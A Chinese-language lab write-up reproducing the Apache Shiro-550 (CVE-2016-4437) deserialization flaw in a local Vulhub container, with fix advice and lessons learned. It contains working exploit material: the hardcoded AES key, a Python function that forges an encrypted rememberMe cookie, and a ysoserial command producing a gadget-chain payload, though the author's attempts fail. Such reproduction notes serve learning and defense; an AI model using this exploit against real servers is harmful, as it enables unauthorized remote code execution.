# CVE-2016-4437 Shiro-550 复现笔记

> 本地 Vulhub 环境 | 复现时间：2026.08.25

---

## 漏洞是个啥情况

简单说就是 Shiro 1.2.4 及之前版本，rememberMe 这个功能用了一个写死的 AES 密钥：

`kPH+bIxk5D2deZiIxcaaaA==`

攻击者知道这个密钥就能自己拼一个恶意 Cookie 发给服务器，服务器解密后反序列化，直接执行系统命令。

网上分析文章很多，这个漏洞的核心就两点：密钥写死 + 反序列化。

---

## 我的实验环境

- 攻击机：Kali Linux（IP 随意，能通靶机就行）
- 靶机：Vulhub 的 shiro 1.2.4 镜像
- 靶机地址：http://192.168.1.81:8080
- 主要工具：Burp Suite、ysoserial、Python

---

## 操作过程

### 起靶场

```bash
cd vulhub/shiro/CVE-2016-4437
docker-compose up -d
https://./screenshots/1-docker-up.png

先看一眼是不是真的有漏洞
浏览器打开靶机登录页，随便抓个包，看响应头里有没有：

text
Set-Cookie: rememberMe=deleteMe
我这边是有的，说明确实开了 rememberMe 功能。

https://./screenshots/3-burp-cookie.png

写脚本生成恶意 Cookie
Shiro 对 rememberMe Cookie 的处理流程大概是：

把恶意对象序列化

AES 加密（CBC 模式，密钥就是上面那个）

最前面拼 16 个字节的 IV（全零）

最后 Base64 编码

我照着这个逻辑写了个 Python 脚本：

python
import base64
from Crypto.Cipher import AES

KEY = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")

def make_shiro_cookie(data):
    iv = b'\x00' * 16
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    pad_len = 16 - len(data) % 16
    data += bytes([pad_len]) * pad_len
    encrypted = cipher.encrypt(data)
    return base64.b64encode(iv + encrypted).decode()
然后用 ysoserial 生成 payload：

bash
java -jar ysoserial-all.jar CommonsCollections2 "id" > payload.ser
跑完脚本得到一串 Base64：

https://./screenshots/5-encrypt-result.png

扔到 Burp 里发出去
在 Burp 里随便抓个请求，把 Cookie 改成：

text
rememberMe=刚才那串Base64
点发送。

https://./screenshots/6-burp-send.png

卡住的地方
发过去之后服务器返回的是 302 重定向，而且把 rememberMe 清掉了：

text
Set-Cookie: rememberMe=deleteMe
Location: /login
意思就是反序列化失败了，Shiro 抛异常后主动清掉了 Cookie。

试了几种链都不行
链	结果
CommonsCollections1	302
CommonsCollections2	302
CommonsBeanutils1	302
Jdk7u21	302
大概原因
应该是靶机环境里缺了对应的 Commons 依赖库，类加载失败就报错了。

这个其实挺常见的，实际环境中也是这个道理——反序列化链不是随便拿一个就能用，得看目标环境装了哪些库。

修复建议（给自己备忘）
升级 Shiro 到 1.2.5 以上，官方已经把硬编码密钥去掉了

如果没法升级，自己写一个随机密钥替换掉默认的

用不到 rememberMe 的话直接关掉也行

这次学到了什么
Shiro 的 Cookie 加密流程基本摸清了（密钥怎么来的、IV 怎么拼的）

反序列化链不是通用的，依赖环境，换了环境可能就不生效

遇到 302 重定向 + deleteMe 大概率是反序列化出了问题，不是密钥不对

后面继续搞
□ 换个靶场环境把 Shiro 跑通
□ Log4j2 的复现也要安排上
